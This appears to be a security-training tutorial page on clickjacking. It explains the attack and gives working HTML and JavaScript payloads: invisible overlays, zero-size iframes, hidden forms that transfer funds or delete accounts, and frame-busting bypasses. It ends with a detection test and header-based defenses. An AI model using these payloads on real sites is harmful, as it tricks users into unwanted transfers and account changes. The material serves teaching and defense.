---
layout: training-page
title: "Clickjacking — Red Team Academy"
module: "Web Hacking"
tags:
  - clickjacking
  - ui-redressing
  - iframe
  - client-side
page_key: "web-clickjacking"
render_with_liquid: false
---

# Clickjacking

Clickjacking is a UI redressing attack where a malicious site tricks users into clicking on elements
  from a different, legitimate site — often embedded invisibly via an iframe. The victim believes they
  are interacting with visible content on the attacker's page, but are actually triggering actions on
  the hidden target site: submitting forms, changing passwords, transferring funds, or liking posts.

## Tools

- Burp Suite — intercept and replay framing requests
- OWASP ZAProxy — automated clickjacking detection
- machine1337/clickjack — `github.com/machine1337/clickjack`

## Attack Techniques

### UI Redressing

An attacker overlays a fully transparent `<div>` covering the entire viewport.
  The transparent layer contains hidden links or buttons. When the user clicks what looks like the
  attacker's content, they actually interact with the invisible overlay.

```
<div style="opacity: 0; position: absolute; top: 0; left: 0; height: 100%; width: 100%;">
  <a href="https://bank.example.com/transfer?to=attacker&amount=1000">Click me</a>
</div>
```

### Invisible Frames

An iframe is loaded with zero dimensions and no border, making it invisible to the user.
  The iframe loads the target application silently. Visible decoy elements are positioned on top
  to lure the user into clicking precisely where a button or link exists in the iframe.

```
<iframe src="https://target-site.com/account/settings"
        style="opacity: 0; height: 0; width: 0; border: none;"></iframe>
```

### Button and Form Hijacking

A visible, enticing button is presented to the user. Behind it sits a hidden form pointing to a
  malicious action. When the user clicks the visible button, JavaScript submits the hidden form.

```
<!-- Visible decoy -->
<button onclick="submitForm()">Click to win a prize!</button>

<!-- Hidden malicious form -->
<form action="https://target.com/api/delete-account" method="POST" id="hidden-form" style="display: none;">
  <input type="hidden" name="confirm" value="yes">
</form>

<script>
  function submitForm() {
    document.getElementById('hidden-form').submit();
  }
</script>
```

### Full Execution Chain

```
<!-- Step 1: hidden form with pre-filled malicious values -->
<form action="https://target.com/api/transfer" method="POST"
      id="hidden-form" style="display: none;">
  <input type="hidden" name="to"     value="attacker-account">
  <input type="hidden" name="amount" value="5000">
</form>

<!-- Step 2: visible lure positioned over the target's confirm button -->
<button style="position: absolute; top: 300px; left: 200px;"
        onclick="document.getElementById('hidden-form').submit()">
  Claim reward
</button>
```

## Frame-Busting Bypass Techniques

### onBeforeUnload Event

Frame-busting scripts try to escape iframes by setting `top.location = self.location`.
  An attacker can defeat this by registering an `onbeforeunload` handler that cancels
  the navigation attempt.

```
<h1>www.attacker.com</h1>
<script>
  window.onbeforeunload = function() {
    return "Do you want to leave attacker.com?";
  }
</script>
<iframe src="https://target-site.com"></iframe>
```

Automated version (no user prompt required) — loops navigation to a 204 No Content page:

```
<script>
  var prevent_bust = 0;
  window.onbeforeunload = function() {
    prevent_bust++;
  };
  setInterval(function() {
    if (prevent_bust > 0) {
      prevent_bust -= 2;
      window.top.location = "https://attacker.com/204.php";
    }
  }, 1);
</script>
<iframe src="https://target-site.com"></iframe>
```

204.php (server-side helper):

```
<?php
  header("HTTP/1.1 204 No Content");
?>
```

### IE8 XSS Filter Bypass

The IE8 XSS filter disabled inline scripts when it detected a reflected XSS pattern. An attacker
  could trick the filter into disabling the frame-busting script by including the beginning of the
  script in a URL parameter.

```
<!-- Target's frame-buster -->
<script>
  if (top != self) { top.location = self.location; }
</script>

<!-- Attacker's iframe that triggers the XSS filter on the buster -->
<iframe src="https://target-site.com/?param=<script>if"></iframe>
```

### Chrome XSSAuditor Bypass

```
<iframe src="https://target-site.com/?param=if(top+!%3D+self)+%7B+top.location%3Dself.location%3B+%7D">
</iframe>
```

### Sandbox Attribute (JavaScript Disabling)

```
<!-- Disables JavaScript in the framed page, killing the frame-buster -->
<iframe src="https://target-site.com" sandbox></iframe>

<!-- IE-specific restriction -->
<iframe src="https://target-site.com" security="restricted"></iframe>
```

## Detection and Testing

To test if a site is vulnerable: attempt to embed it in an iframe on a test page.
  If the page loads inside the frame without redirecting or displaying an error, it is potentially
  vulnerable to clickjacking.

```
<!-- Simple test page -->
<html>
<body>
  <iframe src="https://target.com" width="800" height="600"></iframe>
</body>
</html>
```

Also check for the presence of `X-Frame-Options` and `Content-Security-Policy`
  headers in the response. Missing or misconfigured headers indicate exposure.

## Defenses

### X-Frame-Options Header

```
# Apache — prevent all framing
Header always append X-Frame-Options DENY

# Apache — allow same origin only
Header always append X-Frame-Options SAMEORIGIN
```

### Content-Security-Policy frame-ancestors

```
# CSP — allow same origin only (preferred modern approach)
Content-Security-Policy: frame-ancestors 'self';

# HTML meta tag equivalent
<meta http-equiv="Content-Security-Policy" content="frame-ancestors 'self';">
```

## Resources

- PayloadsAllTheThings Clickjacking — `github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Clickjacking`
- PortSwigger Web Security — Clickjacking — `portswigger.net/web-security/clickjacking`
- OWASP Clickjacking — `owasp.org/www-community/attacks/Clickjacking`
- OWASP WebGoat practice lab — `owasp.org/www-project-webgoat/`
- machine1337/clickjack tool — `github.com/machine1337/clickjack`
